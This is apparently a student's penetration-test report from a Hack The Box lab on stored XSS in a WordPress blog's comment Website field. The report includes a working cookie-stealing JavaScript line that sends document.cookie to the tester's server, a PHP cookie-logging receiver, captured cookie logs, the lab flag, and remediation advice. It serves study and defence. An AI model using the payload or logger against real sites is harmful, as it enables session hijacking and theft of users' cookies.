# Web Application Penetration Testing Report
## XSS Skills Assessment — Stored XSS / Session Hijacking

**Assessment Type:** Web Application Penetration Testing  
**Target:** `10.129.121.194`  
**Application Path:** `/assessment/`  
**Primary Finding:** Stored Cross-Site Scripting (XSS) in the Website input field  
**Impact Demonstrated:** Session cookie disclosure / session hijacking  
**Assessment Environment:** Hack The Box (authorized lab environment)  
**Tester:** Student / Lab Participant  
**Date:** 28 August 2026

---

## 1. Executive Summary

This assessment tested the Security Blog web application for Cross-Site Scripting (XSS) vulnerabilities and demonstrated the impact of a successful stored XSS vulnerability.

The assessment objectives were:

1. Identify a user-input field vulnerable to XSS.
2. Identify a working XSS payload capable of executing JavaScript in the victim/admin browser.
3. Use the XSS vulnerability to retrieve the victim's cookies and identify the flag contained in the session cookie data.

The vulnerable input was identified as the **Website** field in the WordPress-based Security Blog comment functionality.

A remote JavaScript file hosted on the tester's Kali machine was used to verify execution. The victim/admin browser requested the remote script from the tester's machine, proving that the supplied input was rendered/executed in a privileged browsing context.

The JavaScript was then changed to transmit `document.cookie` to a PHP endpoint hosted on the tester's machine. The resulting request contained the WordPress cookies and the assessment flag.

The final captured cookie data contained:

```text
wordpress_test_cookie=WP Cookie check;
wp-settings-time-2=1787861958;
flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```

Therefore, the assessment successfully demonstrated a stored XSS leading to cookie disclosure.

---

# 2. Scope

## 2.1 Target

```text
10.129.121.194
```

## 2.2 Application

```text
http://10.129.121.194/assessment/
```

The application presented itself as a Security Blog and was identified from the supplied HTML as running:

```text
WordPress 5.7.2
```

The assessment was performed against the provided Hack The Box lab target.

---

# 3. Objectives

The stated assessment objectives were:

### Objective 1 — Identify XSS

Find a user-controlled input field where supplied HTML/JavaScript is interpreted by the application rather than safely encoded.

### Objective 2 — Confirm JavaScript execution

Find a payload that causes JavaScript to execute in the target browser.

### Objective 3 — Demonstrate session hijacking impact

Use JavaScript to read the victim's accessible cookies and transmit them to the tester-controlled server.

---

# 4. Initial Reconnaissance

The application was accessed through:

```text
http://10.129.121.194/assessment/
```

The application contained a Security Blog post titled:

```text
Welcome to Security Blog
```

The page stated that comments must be approved by an administrator.

This is significant because a comment that contains a stored XSS payload may not execute immediately in the attacker's browser. Instead, it may execute when an administrator reviews the submitted comment.

This creates a classic stored/blind XSS scenario:

```text
Tester
   |
   | submits malicious comment
   v
Web Application
   |
   | stores comment
   v
Administrator reviews comment
   |
   | browser renders stored content
   v
JavaScript executes
```

---

# 5. Application Technology

The supplied page source contained the following WordPress generator metadata:

```html
<meta name="generator" content="WordPress 5.7.2" />
```

The application also referenced the Twenty Twenty-One WordPress theme:

```text
twentytwentyone
```

The application therefore appeared to be a WordPress installation.

---

# 6. Initial XSS Testing

The search functionality was initially tested to determine whether reflected input was executed.

A request equivalent to:

```text
http://10.129.121.194/assessment/?s=<script>alert(1)</script>
```

was tested.

The server response showed that the input was HTML-encoded.

Relevant output:

```html
Results for "&lt;script&gt;alert(1)&lt;/script&gt;"
```

and:

```html
<input
    type="search"
    ...
    value="&lt;script&gt;alert(1)&lt;/script;"
    name="s"
/>
```

This demonstrated that the search parameter was reflected, but the `<script>` tags were encoded as:

```text
&lt;script&gt;
```

Therefore, the search parameter did not provide a straightforward reflected XSS using the tested payload.

This was an important negative result and prevented the assessment from incorrectly treating the search functionality as vulnerable.

---

# 7. Discovery of the Comment Functionality

The blog post provided a comment form containing the following user-controlled fields:

```text
Comment
Name
Email
Website
```

The relevant page was:

```text
http://10.129.121.194/assessment/index.php/2021/06/11/welcome-to-security-blog/
```

The comment functionality was particularly interesting because the application indicated that comments require administrator approval.

This means a stored payload could potentially be executed when the administrator views the comment.

---

# 8. Website Field Testing

The **Website** field was selected for testing.

The assessment used a remote JavaScript file hosted from the tester's Kali machine.

The tester's machine IP was:

```text
10.10.17.220
```

A temporary directory was created:

```bash
mkdir /tmp/assessment
cd /tmp/assessment
```

A test JavaScript file was created:

```bash
echo 'console.log("XSS TEST");' > test.js
```

The file was then served using PHP's built-in HTTP server:

```bash
php -S 0.0.0.0:80
```

The server displayed:

```text
PHP 8.4.24 Development Server
(http://0.0.0.0:80) started
```

---

# 9. Understanding the Remote Script

The important concept behind the test was:

```html
<script src="http://10.10.17.220/test.js"></script>
```

The browser does not need the JavaScript file to exist on the target web server.

Instead:

1. The target page contains the `<script>` element.
2. The browser sees the `src` attribute.
3. The browser connects to `10.10.17.220`.
4. The tester's PHP server receives the request.
5. The server returns `test.js`.
6. The browser executes the returned JavaScript in the context of the vulnerable page.

The PHP command:

```bash
php -S 0.0.0.0:80
```

made the tester's machine act as a simple HTTP server.

The `0.0.0.0` bind address means PHP listens on available local interfaces rather than only on localhost.

---

# 10. Initial Remote Script Test

During testing, an incorrect path was initially observed:

```text
GET /url
```

The PHP server returned:

```text
404: GET /url - No such file or directory
```

This occurred because no file named `url` existed in the document root.

The test was subsequently changed to use:

```text
/test.js
```

The server then received:

```text
10.129.121.194:42682 [200]: GET /test.js
```

This was the critical confirmation.

The target machine successfully requested the tester-hosted JavaScript file.

---

# 11. Confirmation of Stored XSS

The following server request was observed:

```text
[200]: GET /test.js
```

The request originated from:

```text
10.129.121.194
```

The tester's server was:

```text
10.10.17.220
```

This demonstrated that the target browser loaded the remote JavaScript.

The request flow was therefore:

```text
Stored Website input
        |
        v
Administrator views comment
        |
        v
Browser requests:
http://10.10.17.220/test.js
        |
        v
Tester server receives GET /test.js
        |
        v
JavaScript is returned to browser
```

This confirmed the vulnerable Website input.

---

# 12. Cookie Capture Preparation

After confirming that the remote script executed, the test JavaScript was changed to send the browser's accessible cookies to the tester-controlled PHP endpoint.

The JavaScript used was:

```javascript
new Image().src='http://10.10.17.220/index.php?c='+encodeURIComponent(document.cookie);
```

The use of `encodeURIComponent()` ensured that special characters in the cookie string were safely represented inside the URL query parameter.

The PHP endpoint was hosted from the same directory as `index.php`.

---

# 13. Cookie Capture Server

The PHP cookie receiver was created as:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);

    foreach ($list as $value) {
        $cookie = urldecode($value);

        file_put_contents(
            "cookies.txt",
            "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n",
            FILE_APPEND
        );
    }
}
?>
```

The server was started with:

```bash
php -S 0.0.0.0:80
```

---

# 14. Why Two HTTP Requests Appeared

Once the malicious script executed, two related requests could be observed.

### Request 1 — Load the JavaScript

```text
GET /test.js
```

This occurred because the vulnerable page caused the browser to load the externally hosted script.

### Request 2 — Send the cookie data

```text
GET /index.php?c=...
```

This occurred because the JavaScript created an image request whose URL contained:

```text
document.cookie
```

The overall chain was:

```text
Browser
  |
  | GET /test.js
  v
Tester PHP Server
  |
  | returns JavaScript
  v
Browser executes JavaScript
  |
  | GET /index.php?c=<encoded cookies>
  v
Tester PHP Server
```

---

# 15. Successful Cookie Capture

The final server output was:

```text
10.129.121.194:42682 [200]: GET /test.js
```

followed by:

```text
10.129.121.194:42684 [200]: GET /index.php?c=wordpress_test_cookie%3DWP%2520Cookie%2520check%3B%20wp-settings-time-2%3D1787861958%3B%20flag%3DHTB%7Bcr055_5173_5cr1p71n6_n1nj4%7D
```

This confirmed that the JavaScript successfully retrieved and transmitted the browser's accessible cookies.

---

# 16. Decoding the Captured Data

The encoded query parameter was:

```text
wordpress_test_cookie%3DWP%2520Cookie%2520check%3B%20wp-settings-time-2%3D1787861958%3B%20flag%3DHTB%7Bcr055_5173_5cr1p71n6_n1nj4%7D
```

After URL decoding, the cookie string was:

```text
wordpress_test_cookie=WP%20Cookie%20check;
wp-settings-time-2=1787861958;
flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```

After decoding the cookie value as well:

```text
wordpress_test_cookie=WP Cookie check;
wp-settings-time-2=1787861958;
flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```

---

# 17. Flag

The assessment flag obtained from the captured cookie was:

```text
HTB{cr055_5173_5cr1p71n6_n1nj4}
```

---

# 18. Complete Attack Chain

The complete attack can be represented as follows:

```text
                    +----------------------+
                    |   Security Blog      |
                    | 10.129.121.194       |
                    +----------+-----------+
                               |
                               | Comment submission
                               v
                    +----------------------+
                    | Website input field  |
                    | Stored XSS payload   |
                    +----------+-----------+
                               |
                               | Stored
                               v
                    +----------------------+
                    | Administrator views  |
                    | submitted comment    |
                    +----------+-----------+
                               |
                               | Browser executes
                               v
                    +----------------------+
                    | Remote test.js       |
                    | 10.10.17.220         |
                    +----------+-----------+
                               |
                               | JavaScript
                               | executes
                               v
                    +----------------------+
                    | document.cookie      |
                    +----------+-----------+
                               |
                               | HTTP request
                               v
                    +----------------------+
                    | Tester PHP server    |
                    | /index.php?c=...     |
                    +----------+-----------+
                               |
                               v
                    +----------------------+
                    | Captured cookies     |
                    | + assessment flag    |
                    +----------------------+
```

---

# 19. Evidence

## Evidence 1 — Target

```text
10.129.121.194
```

## Evidence 2 — Tester Server

```text
10.10.17.220
```

## Evidence 3 — Remote JavaScript Request

```text
10.129.121.194:42682 [200]: GET /test.js
```

## Evidence 4 — Cookie Exfiltration Request

```text
10.129.121.194:42684 [200]: GET /index.php?c=...
```

## Evidence 5 — Captured Cookie

```text
wordpress_test_cookie=WP Cookie check;
wp-settings-time-2=1787861958;
flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```

---

# 20. Impact

The vulnerability has significant impact because JavaScript executing in the context of the vulnerable application can potentially access browser data available to JavaScript.

In this lab, the impact was demonstrated by retrieving:

```javascript
document.cookie
```

and sending the resulting data to a tester-controlled server.

The captured data included an assessment flag and demonstrated that sensitive cookie information was accessible to the injected JavaScript.

If an authentication/session cookie is accessible to JavaScript, an attacker may potentially use the stolen session material to impersonate the associated user.

---

# 21. Root Cause

The root cause is insufficient output handling of user-controlled content in the Website field.

The application stored attacker-controlled content and later rendered it in a context where the browser interpreted the content as executable HTML/JavaScript.

The security issue is therefore consistent with:

```text
Stored Cross-Site Scripting
```

The administrator-review workflow made the issue effectively blind from the attacker's perspective because the attacker did not directly observe the administrator's page.

---

# 22. Why the Search Test Was Different

The search parameter was also tested:

```text
?s=<script>alert(1)</script>
```

However, the response encoded the input:

```html
&lt;script&gt;alert(1)&lt;/script&gt;
```

Therefore the browser treated it as text rather than an executable script element.

The Website field behaved differently because the supplied payload ultimately caused the administrator browser to request the tester-controlled JavaScript.

This illustrates an important XSS testing principle:

> The same payload can behave differently depending on where the application places and encodes user-controlled input.

---

# 23. Blind XSS Methodology

This assessment demonstrated the reason blind XSS often uses an out-of-band callback.

In a normal reflected XSS test, the tester can immediately see the result:

```text
Input
  |
  v
Response
  |
  v
Browser
  |
  v
JavaScript executes
```

In a blind/stored scenario:

```text
Input
  |
  v
Stored by application
  |
  v
Administrator reviews it later
  |
  v
JavaScript executes
```

The tester may never see the administrator's browser.

An external callback solves this visibility problem:

```text
Administrator browser
        |
        | HTTP callback
        v
Tester server
```

Receiving the callback proves that the payload reached and executed in the browser.

---

# 24. Testing Lessons

Several important lessons were demonstrated during this assessment.

### 24.1 A reflected parameter may not be exploitable

The search parameter reflected input but encoded HTML characters.

Reflection alone does not automatically mean XSS.

### 24.2 Stored XSS can execute later

A stored payload may execute only when another user, such as an administrator, views the affected content.

### 24.3 Out-of-band callbacks are useful

A callback to a tester-controlled server can confirm execution even when the vulnerable page cannot be directly observed.

### 24.4 Remote JavaScript hosting

The browser retrieves the external JavaScript using the URL supplied in the `src` attribute.

The tester's PHP server provided the JavaScript file.

### 24.5 HTTP logs provide valuable evidence

The following was enough to confirm successful execution:

```text
GET /test.js
```

The subsequent:

```text
GET /index.php?c=...
```

confirmed that the JavaScript performed the intended callback.

---

# 25. Remediation Recommendations

## 25.1 Context-Aware Output Encoding

All user-controlled data should be encoded according to its output context.

For example:

- HTML context → HTML entity encoding
- HTML attribute context → attribute encoding
- JavaScript context → JavaScript-safe encoding
- URL context → URL encoding

---

## 25.2 Sanitize User-Generated HTML

If HTML is genuinely required in comments or Website fields, use a strict allowlist-based HTML sanitizer.

Do not attempt to secure the application using simple blacklist filtering such as blocking:

```text
<script>
```

Attackers may use many alternative HTML/JavaScript constructs.

---

## 25.3 Validate the Website Field

The Website field should be validated as a URL if it is intended to contain a URL.

Only expected schemes should be accepted, for example:

```text
https://
```

and, where required:

```text
http://
```

Potentially dangerous schemes such as:

```text
javascript:
```

should not be accepted.

---

## 25.4 Protect Authentication Cookies

Authentication/session cookies should use:

```text
HttpOnly
Secure
SameSite
```

where appropriate.

`HttpOnly` is particularly important because it prevents ordinary JavaScript from reading the cookie through:

```javascript
document.cookie
```

This does not eliminate XSS, but it can substantially reduce the impact of cookie theft.

---

## 25.5 Implement Content Security Policy

A strong Content Security Policy (CSP) should be considered to reduce the ability of injected content to load arbitrary external scripts.

For example, a carefully designed policy can restrict JavaScript sources to trusted origins.

CSP should be treated as defense-in-depth rather than a replacement for proper output encoding.

---

## 25.6 Review Stored Content

Stored comments and other user-generated content should be treated as untrusted every time they are rendered.

Input validation alone is insufficient.

The application should safely encode or sanitize data at the point where it is output.

---

# 26. Severity Assessment

**Suggested Severity: High**

Rationale:

- User-controlled content was stored.
- The content executed as JavaScript in another user's browser.
- The affected context involved an administrator.
- JavaScript was able to access cookies exposed to `document.cookie`.
- The assessment demonstrated transmission of sensitive browser data to an external server.
- The captured data contained the assessment flag.

The exact production severity would depend on whether authentication cookies are accessible to JavaScript, the privileges of the affected user, and the application's broader security controls.

---

# 27. Reproduction Summary

The following summarizes the successful reproduction performed in the authorized lab.

### Step 1 — Identify the target

```text
http://10.129.121.194/assessment/
```

### Step 2 — Locate comment functionality

Navigate to the Security Blog post and locate the comment form.

### Step 3 — Identify candidate fields

The form contained:

```text
Comment
Name
Email
Website
```

### Step 4 — Host a test JavaScript file

```bash
mkdir /tmp/assessment
cd /tmp/assessment
echo 'console.log("XSS TEST");' > test.js
php -S 0.0.0.0:80
```

### Step 5 — Test the Website field

Use the remote JavaScript URL pointing to:

```text
http://10.10.17.220/test.js
```

### Step 6 — Confirm execution

Observe:

```text
GET /test.js
```

from:

```text
10.129.121.194
```

### Step 7 — Replace the test script with the cookie callback

The JavaScript used:

```javascript
new Image().src='http://10.10.17.220/index.php?c='+encodeURIComponent(document.cookie);
```

### Step 8 — Receive the callback

Observe:

```text
GET /index.php?c=...
```

### Step 9 — Decode the cookie

The resulting data contained:

```text
flag=HTB{cr055_5173_5cr1p71n6_n1nj4}
```

### Step 10 — Assessment objective achieved

The stored XSS and resulting cookie disclosure were successfully demonstrated.

---

# 28. Final Conclusion

The Security Blog was successfully tested for XSS vulnerabilities.

The search functionality was initially investigated, but the tested payload was safely HTML-encoded and did not execute.

Further testing of the comment functionality identified the **Website field** as the vulnerable input.

A remotely hosted JavaScript file was used as an out-of-band execution detector. The tester's server received:

```text
GET /test.js
```

from the target environment, confirming that the stored payload executed in the administrator's browser.

The JavaScript was then configured to transmit `document.cookie` to the tester's PHP server. The resulting request contained the WordPress cookie data and the assessment flag:

```text
HTB{cr055_5173_5cr1p71n6_n1nj4}
```

The assessment therefore successfully demonstrated:

```text
Stored XSS
      ↓
Blind/Out-of-Band Confirmation
      ↓
JavaScript Execution
      ↓
Cookie Disclosure
      ↓
Session Hijacking Impact
```

The primary remediation is to correctly encode/sanitize untrusted user input according to its output context, validate the Website field, and protect session cookies with appropriate security attributes such as `HttpOnly`, `Secure`, and `SameSite`.

---

# Appendix A — Key Commands Used

## Start web server

```bash
cd /tmp/assessment
php -S 0.0.0.0:80
```

## Create test JavaScript

```bash
echo 'console.log("XSS TEST");' > test.js
```

## Verify the file

```bash
cat test.js
```

Expected:

```javascript
console.log("XSS TEST");
```

---

# Appendix B — Important Evidence

Tester IP:

```text
10.10.17.220
```

Target IP:

```text
10.129.121.194
```

Successful script request:

```text
GET /test.js
```

Successful cookie callback:

```text
GET /index.php?c=...
```

Captured flag:

```text
HTB{cr055_5173_5cr1p71n6_n1nj4}
```

---

# Appendix C — Security Concepts Demonstrated

| Concept | Demonstrated |
|---|---|
| User input testing | Yes |
| Reflected input analysis | Yes |
| HTML output encoding | Yes |
| Stored XSS | Yes |
| Blind XSS | Yes |
| Out-of-band callback | Yes |
| Remote JavaScript loading | Yes |
| `document.cookie` access | Yes |
| Cookie exfiltration | Yes |
| Session hijacking impact | Yes |
| Security remediation | Yes |

---

## End of Report
